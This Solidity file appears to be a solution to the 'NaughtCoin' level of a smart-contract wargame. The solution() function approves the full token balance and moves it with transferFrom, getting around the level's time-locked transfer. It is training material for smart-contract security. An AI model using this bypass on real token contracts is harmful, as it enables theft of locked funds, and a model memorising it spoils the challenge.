// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {NaughtCoinFactory} from "../src/levels/15-NaughtCoinFactory.sol";
import {NaughtCoin} from "../src/levels/15-NaughtCoin.sol";

contract NaughtCoinSolution is BaseTest {

    function solution(address payable target_) internal override{
        uint256 amount = 1000000 * (10 ** 18);
        NaughtCoin target = NaughtCoin(target_);
        target.approve(attacker, amount);
        target.transferFrom(attacker, address(this), amount);
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new NaughtCoinFactory()));
    }
}
